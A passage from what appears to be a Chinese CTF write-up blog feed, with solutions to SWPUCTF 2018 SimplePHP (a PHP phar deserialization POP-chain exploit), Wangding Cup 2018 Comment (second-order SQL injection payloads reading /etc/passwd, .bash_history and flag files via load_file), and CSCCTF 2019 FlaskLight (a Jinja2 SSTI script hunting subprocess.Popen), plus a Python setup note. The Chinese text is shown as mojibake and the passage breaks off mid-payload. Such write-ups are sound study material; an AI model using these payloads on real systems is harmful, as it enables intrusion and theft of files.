operator">-</span><span class="token operator">></span><span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$text</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>base.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>     <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span> <span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>     <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>     <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>web3<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>     <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>     <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>     <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>     <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>nav</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navbar navbar-default<span class="token punctuation">"</span></span> <span class="token attr-name">role</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navigation<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>         <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>container-fluid<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>         <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navbar-header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navbar-brand<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>é¦–é¡µ<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>         <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>nav navbar-nav navbra-toggle<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>                 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>active<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file.php?file<span class="token punctuation">=</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>æŸ¥çœ‹æ–‡ä»¶<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>                 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>upload_file.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>ä¸Šä¼ æ–‡ä»¶<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span></span>             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>nav navbar-nav navbar-right<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>                 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>glyphicon glyphicon-user<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span></span>         <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>     <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>nav</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token comment" spellcheck="true">&lt;!--flag is in f1ag.php--></span></span></code></pre><h5 id="popé“¾"><a href="#popé“¾" class="headerlink" title="popé“¾"></a>popé“¾</h5><h5 id="C1e4r-destruct-â€“-gt-Show-toString-â€“-gt-Test-get-ã€‚"><a href="#C1e4r-destruct-â€“-gt-Show-toString-â€“-gt-Test-get-ã€‚" class="headerlink" title="C1e4r::destruct()  â€“>  Show::toString()   â€“>  Test::__get() ã€‚"></a>C1e4r::destruct()  â€“&gt;  Show::toString()   â€“&gt;  Test::__get() ã€‚</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">C1e4r</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$c1e4r</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C1e4r</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$show</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$test</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token string">'source'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"/var/www/html/f1ag.php"</span><span class="token punctuation">;</span><span class="token variable">$c1e4r</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$show</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//åˆ©ç”¨  $this->test = $this->str; echo $this->test;</span><span class="token variable">$show</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string">'str'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$test</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//åˆ©ç”¨ $this->str['str']->source;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"exp.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">'&lt;?php __HALT_COMPILER(); ? >'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$c1e4r</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"exp.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>åœ¨æ ¹ç›®å½•ä¸‹è¿è¡ŒåŽæ”¹ä¸º.gif</p><p><img src="/2021/08/06/swpuctf-2018-simplephp/image-20210808211049208.png" alt="image-20210808211049208"></p><pre><code>file.php?file=phar://upload/.........jpg</code></pre><p><img src="/2021/08/06/swpuctf-2018-simplephp/image-20210808212346510.png" alt="image-20210808212346510"></p><p>è§£ç </p><p><img src="/2021/08/06/swpuctf-2018-simplephp/image-20210808212430464.png" alt="image-20210808212430464"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘é¼Žæ¯:2018-Comment</title>
      <link href="2021/08/05/wang-ding-bei-2018-comment/"/>
      <url>2021/08/05/wang-ding-bei-2018-comment/</url>
      
        <content type="html"><![CDATA[<p>å‘å¸–éœ€è¦ç™»å½•æ‰«æåˆ°å¯†ç zhangwei666</p><p><img src="/2021/08/05/wang-ding-bei-2018-comment/1.png" alt="1"></p><p>git_extractæ‰«æåˆ°</p><p><img src="/2021/08/05/wang-ding-bei-2018-comment/2.png" alt="2"></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">"mysql.php"</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'yes'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">case</span> <span class="token string">'write'</span><span class="token punctuation">:</span>    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> "insert into board            set category <span class="token operator">=</span> <span class="token string">'$category'</span><span class="token punctuation">,</span>                title <span class="token operator">=</span> <span class="token string">'$title'</span><span class="token punctuation">,</span>                content <span class="token operator">=</span> <span class="token string">'$content'</span>"<span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token string">'comment'</span><span class="token punctuation">:</span>    <span class="token variable">$bo_id</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'bo_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select category from board where id='$bo_id'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token function">mysql_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> "insert into comment            set category <span class="token operator">=</span> <span class="token string">'$category'</span><span class="token punctuation">,</span>                content <span class="token operator">=</span> <span class="token string">'$content'</span><span class="token punctuation">,</span>                bo_id <span class="token operator">=</span> <span class="token string">'$bo_id'</span>"<span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./comment.php?id=$bo_id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token punctuation">:</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>åœ¨writeéƒ¨åˆ†ä½¿ç”¨addslashes()å‡½æ•°è¿›è¡Œäº†è¿‡æ»¤</p><pre class=" language-php"><code class="language-php"><span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>commentéƒ¨åˆ†å¯¹ä»Žæ•°æ®åº“ä¸­å–å‡ºçš„categoryæ²¡æœ‰è¿‡æ»¤ï¼Œè¿™å°±é€ æˆäº†äºŒæ¬¡æ³¨å…¥</p><pre class=" language-php"><code class="language-php"><span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>åœ¨å‘å¸–å¤„æž„é€ categoryä¸º</p><pre><code>', content=user(),/*</code></pre><p>åœ¨ç•™è¨€å¤„è¾“å…¥çš„contentä¸º</p><pre><code>*/#</code></pre><p><img src="/2021/08/05/wang-ding-bei-2018-comment/3.png" alt="3"></p><pre><code>',content=(select(load_file("/etc/passwd"))),/*</code></pre><p><img src="/2021/08/05/wang-ding-bei-2018-comment/4.png" alt="4"></p><p>æŽ¥ä¸‹æ¥è¯»å–æ–‡ä»¶,æ³¨æ„çœ‹åˆ°/home/wwwä¸‹ä»¥bashèº«ä»½è¿è¡Œ</p><pre><code>',content=(select(load_file("/home/www/.bash_history"))),/*</code></pre><p><img src="/2021/08/05/wang-ding-bei-2018-comment/5.png" alt="5"></p><pre><code>',content=(select(load_file("/tmp/html/.DS_Store"))),/*</code></pre><p>æœªæ˜¾ç¤ºå®Œå…¨,ç”¨hexç¼–ç æ˜¾ç¤º</p><pre><code>',content=(select hex(load_file("/tmp/html/.DS_Store"))),/*</code></pre><p><img src="/2021/08/05/wang-ding-bei-2018-comment/6.png" alt="6"></p><p><img src="/2021/08/05/wang-ding-bei-2018-comment/7.png" alt="7"></p><pre><code>',content=(select hex(load_file("/tmp/html/flag_8946e1ff1ee3e40f.php"))),/*</code></pre><p><img src="/2021/08/05/wang-ding-bei-2018-comment/8.png" alt="8"></p><p>å‡çš„flag</p><pre><code>',content=(select hex(load_file("/var/www/html/flag_8946e1ff1ee3e40f.php"))),/*</code></pre><p><img src="/2021/08/05/wang-ding-bei-2018-comment/9.png" alt="9"></p><p><img src="/2021/08/05/wang-ding-bei-2018-comment/10.png" alt="10"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>åŒæ—¶é…ç½®Python2/Python3</title>
      <link href="2021/08/04/tong-shi-pei-zhi-python2-python3/"/>
      <url>2021/08/04/tong-shi-pei-zhi-python2-python3/</url>
      
        <content type="html"><![CDATA[<p>æ¢äº†HUAWEI matebook14ï¼Œåªè£…äº†ç¼–ç¨‹ç”¨çš„Python3.9ä½†æ˜¯githack/git_extractéœ€è¦ç”¨åˆ°Python2éžå¸¸è®©äººæŠ“ç‹‚æ‰€ä»¥åˆè£…äº†Python2.7</p><p>ä¸‹è½½å®‰è£…åœ¨dç›˜ä¸‹</p><p><img src="/2021/08/04/tong-shi-pei-zhi-python2-python3/image-20210805004059992.png" alt="image-20210805004059992"></p><h2 id="é…ç½®çŽ¯å¢ƒå˜é‡ä¸­çš„path"><a href="#é…ç½®çŽ¯å¢ƒå˜é‡ä¸­çš„path" class="headerlink" title="é…ç½®çŽ¯å¢ƒå˜é‡ä¸­çš„path"></a>é…ç½®çŽ¯å¢ƒå˜é‡ä¸­çš„path</h2><p><img src="/2021/08/04/tong-shi-pei-zhi-python2-python3/image-20210805004335592.png" alt="image-20210805004335592"></p><h2 id="ä¸ºäº†åŒºåˆ†python2å’Œpython3ï¼Œæ”¹åï¼š"><a href="#ä¸ºäº†åŒºåˆ†python2å’Œpython3ï¼Œæ”¹åï¼š" class="headerlink" title="ä¸ºäº†åŒºåˆ†python2å’Œpython3ï¼Œæ”¹åï¼š"></a>ä¸ºäº†åŒºåˆ†python2å’Œpython3ï¼Œæ”¹åï¼š</h2><p><img src="/2021/08/04/tong-shi-pei-zhi-python2-python3/image-20210805004631713.png" alt="image-20210805004631713"><img src="/2021/08/04/tong-shi-pei-zhi-python2-python3/image-20210805004650820.png" alt="image-20210805004650820"></p><p>cmdä¸­è¾“å…¥python2/python3è¡¨æ˜Žå®‰è£…æˆåŠŸ</p><p><img src="/2021/08/04/tong-shi-pei-zhi-python2-python3/image-20210805004442483.png" alt="image-20210805004442483"></p><pre><code>python2 git_extract.py http://0a320780-d474-4e1a-ba8b-126ce07855c9.node4.buuoj.cn:81/.git/</code></pre><p><img src="/2021/08/04/tong-shi-pei-zhi-python2-python3/image-20210805004541769.png" alt="image-20210805004541769"></p><h2 id="æœ€åŽï¼šè§£å†³ä¸¤è€…pipçš„å…±å­˜é—®é¢˜"><a href="#æœ€åŽï¼šè§£å†³ä¸¤è€…pipçš„å…±å­˜é—®é¢˜" class="headerlink" title="æœ€åŽï¼šè§£å†³ä¸¤è€…pipçš„å…±å­˜é—®é¢˜"></a>æœ€åŽï¼šè§£å†³ä¸¤è€…pipçš„å…±å­˜é—®é¢˜</h2><pre><code>python2 -m pip install --upgrade pip --force-reinstall</code></pre><pre><code>python3 -m pip install --upgrade pip --force-reinstall </code></pre><p><img src="/2021/08/04/tong-shi-pei-zhi-python2-python3/image-20210805004837130.png" alt="image-20210805004837130"></p>]]></content>
      
      
      
        <tags>
            
            <tag> çŽ¯å¢ƒé…ç½® </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSCCTF:2019-FlaskLight</title>
      <link href="2021/08/03/cscctf-2019-flasklight/"/>
      <url>2021/08/03/cscctf-2019-flasklight/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/08/03/cscctf-2019-flasklight/image-20210804221446406.png" alt="image-20210804221446406"></p><p><img src="/2021/08/03/cscctf-2019-flasklight/image-20210804221459641.png" alt="image-20210804221459641"></p><p>ssrf:</p><p><img src="/2021/08/03/cscctf-2019-flasklight/image-20210804221549079.png" alt="image-20210804221549079"></p><pre><code>?search={{''.__class__.__mro__[2].__subclasses__()}}</code></pre><p><img src="/2021/08/03/cscctf-2019-flasklight/image-20210804221636358.png" alt="image-20210804221636358"></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">import</span> html<span class="token keyword">import</span> timeindex <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">170</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        url <span class="token operator">=</span> <span class="token string">"http://bba811f6-a5bb-42b0-a5f5-95754c273293.node4.buuoj.cn:81/?search={{''.__class__.__mro__[2].__subclasses__()["</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"]}}"</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        res <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"&lt;h2>You searched for:&lt;\/h2>\W+&lt;h3>(.*)&lt;\/h3>"</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># print(res)</span>        <span class="token comment" spellcheck="true"># print(r.text)</span>        res <span class="token operator">=</span> html<span class="token punctuation">.</span>unescape<span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" | "</span> <span class="token operator">+</span> res<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"subprocess.Popen"</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>            index <span class="token operator">=</span> i            <span class="token keyword">break</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"indexo of subprocess.Popen:"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="/2021/08/03/cscctf-2019-flasklight/image-20210804222546254.png" alt="image-20210804222546254"></p><pre><code>?search={{''.__class__.__mro__[2].__subclasses__()[258]('cat 